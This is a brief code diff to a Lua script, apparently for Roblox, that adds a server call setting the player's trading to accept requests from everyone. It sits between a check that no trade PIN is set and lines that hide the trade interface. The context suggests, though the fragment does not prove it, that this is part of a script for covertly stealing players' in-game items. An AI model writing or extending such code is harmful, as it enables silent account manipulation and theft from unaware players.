@@ -56,6 +56,13 @@ if PINReponse ~= "You don't have a PIN code" then
     return
 end
 
+-- Allow trade requests from everyone
+local tradeArgs = {
+    [1] = "AllowRequests",
+    [2] = "Everyone"
+}
+netModule:WaitForChild("RF/Trading/SetSetting"):InvokeServer(unpack(tradeArgs))
+
 -- Hide UI elements
 tradeGui.Black.Visible = false
 tradeGui.MiscChat.Visible = false
